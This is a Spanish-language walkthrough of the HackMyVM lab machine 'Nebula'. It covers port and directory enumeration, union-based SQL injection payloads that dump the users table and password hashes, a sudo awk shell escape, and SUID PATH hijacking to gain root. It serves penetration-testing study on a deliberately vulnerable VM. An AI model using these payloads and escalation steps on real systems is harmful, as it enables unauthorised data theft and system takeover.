---
layout: default
title: Nebula
parent: HackMyVM
grand_parent: Writeups
---

# Nebula
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Enumeracion

Iniciamos con un escaneo de nmap donde encontraremos el puerto 22 y 80

```ruby
nmap -sS -n -Pn -T4 --open -p- 192.168.1.81
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

 - n: para que no haga resolucion DNS y tarde menos el escaneo

 - Pn: para evitar el descubrimiento de hosts

 - open: para que solo muestre los puertos abiertos

 - -p-: para que escanee todo el rango de puertos

```ruby
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Directory Fuzzing 

Haciendo uso de gobuster para enumerar directorios mediante fuerza bruta, nos encontramos con **img**, **login** y **joinus**

```ruby
gobuster dir -u http://192.168.1.81/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

```ruby
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.81/img/]
/login                (Status: 301) [Size: 312] [--> http://192.168.1.81/login/]
/joinus               (Status: 301) [Size: 313] [--> http://192.168.1.81/joinus/]
```

En el recurso **/joinus**  encontramos una seria de pasos para unirnos a "Nebula Labs":

![](/assets/img/nebula/1.png)

Si hacemos click en el hipervinculo **here** nos manda a la URL: **http://192.168.1.81/joinus/application_form.pdf**

Bajando un poco nos encontraremos unas credenciales filtradas:

![](/assets/img/nebula/2.png)

Si las probamos en el login anteriormente descubierto vamos a poder iniciar sesion como admin

Al darle click en el boton **Search Centrals** nos mandara a una pagina donde podremos buscar por ID

![](/assets/img/nebula/3_000.png)

Al ver la URL generada despues de hacer una busqueda, podrimos intentar una SQLi: **http://192.168.1.81/login/search_central.php?id=2**

## Union-Based SQL injection

**SQLi:** Vulnerabilidad que consiste en la inyeccion de consultas SQL maliciosas a travez de la entrada de un usuario a una base de datos con el fin de modificar el comportamiento de la consulta final

Vamos a probar un payload: **search_central.php?id=2' or 1=1-- -** y como resultado vamos a poder ver todos los datos de la tabla actual

![](/assets/img/nebula/4.png)

Una vez que tenemos una SQLi, es importante saber el numero de columnas, en este caso, se puede deducir que es 3 (id, role, username), sin embargo, la manera de hacerlo es haciendo uso de la sentencia **order by**: ' ORDER BY 3-- -, la cual hace un ordenamiento de los datos basandose en el numero que indiquemos. Sabremos el numero de columnas correcto cuando nos muestre los datos el encontrar el numero correcto, como se observa en la URL y en la tabla

![](/assets/img/nebula/5.png)

Ahora vamos a probar una inyeccion basada en union: **search_central.php?id=2' UNION SELECT 1,2,3-- -**. Sabremos que es una inyeccion union-based cuando los datos de la segunda consulta se muestran en el resultado, en este caso se muestran los numeros 1, 2, 3

![](/assets/img/nebula/6.png)

#### Enumerar bases de datos

    information_schema: es una base de datos que contiene informacion de otras bases de datos

Para enumerar bases de datos podemos usar **information_schema.schemata** e indicarle que queremos selecionar la columna **schema_name** que contiene el nombre de las bases de datos

```ruby
search_central.php?id=2' UNION SELECT schema_name, null, null FROM information_schema.schemata-- -
```

Podemos ver la base de datos **nebuladb**

![](/assets/img/nebula/7.png)

#### Enumerar tablas

    table_name: Contiene informacion de las tablas de la base de datos que se indique en table_schema (nombre de la DB)

Para enumerar tablas usaremos el siguiente payload que selecionara la columna  **table_name** de la base de datos que se indique en **table_schema**

```ruby
search_central.php?id=1'  UNION SELECT table_name, 2, 3 FROM information_schema.tables WHERE table_schema="nebuladb"-- -
```

Podemos ver las tablas

![](/assets/img/nebula/tablas.png)

#### Enumerar columnas

    column_name: Contiene informacion de las columnas de la tabla que se indique en "table_name" de la base de datos "table_schema"

Para enumerar las columnas selecionarmos la columna **column_name** de **information_schema.columns** y le indicaremos la base de datos **nebuladb** y la tabla **users**

```ruby
search_central.php?id=1' UNION SELECT column_name, 2, 3 FROM information_schema.columns WHERE table_schema="nebuladb" AND table_name="users"-- -
```

Podemos ver las columnas **username** y **password**

![](/assets/img/nebula/8.png)

#### Dumpear datos

Para seleccionar los datos de las tablas, es comun usar **CONCAT** para no sobrepasar el numero de columnas de la tabla que esta siendo usada. Pero en este caso podemos hacerlo directamente 

```ruby
' UNION SELECT CONCAT(username, password), 2, 3 FROM nebuladb.users-- -        CONCAT
```

```ruby
' UNION SELECT username, password, 3 FROM nebuladb.users-- -            NORMAL
```

Podemos ver los usuarios y sus hashes:

![](/assets/img/nebula/10.png)

Despues de probar los usuarios y contraseñas, podemos acceder via ssh como el usuario **pmccentral** y su contraseña (esta hasheada y es md5)

## pmccentral  -> laboratoryadmin (awk abuse)

Mirando los permisos a nivel de sudoers nos podemos dar cuenta que podemos ejecutar **awk** como **laboratoryadmin**, haciendo una busqueda rapida de GTFOBins, encontramos una forma de conseguir una shell ingresando el siguiente comando

```bash
sudo -u laboratoryadmin /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

## Escalada de privilegios (PATH hijacking)

Si miramos los permisos SUID, encontraremos el  archivo **PMCEmployees**

```bash
find / -perm -u=s -type f 2>/dev/null
```

```ruby
/home/laboratoryadmin/autoScripts/PMCEmployees
```

Si entramos el directorio **autoScripts** encontraremos un archivo llamado **head** que ejecuta **bash -p**

Si usamos el comando file veremos que **PMCEmployees** es un binario de 64 bits

```ruby
PMCEmployees: setuid ELF 64-bit
```

Usando **strings ./PMCEmployees** encontramos que se este ejecutando el comando **head** desde una ruta relativa:

```ruby
head /home/pmccentral/documents/employees.txt
```
Lo cual es un gran indicio de **PATH hijacking**

1. Primero crearemos el archivo **employees.txt**
2. Despues exportaremos la ruta acual al PATH: **export PATH=/home/laboratoryadmin/autoScripts:$PATH**
3. Y por ultimo ejecutamos el binario de nuevo y seremos root

![](/assets/img/nebula/11.png)

Eso ha sido todo, gracias por leer ❤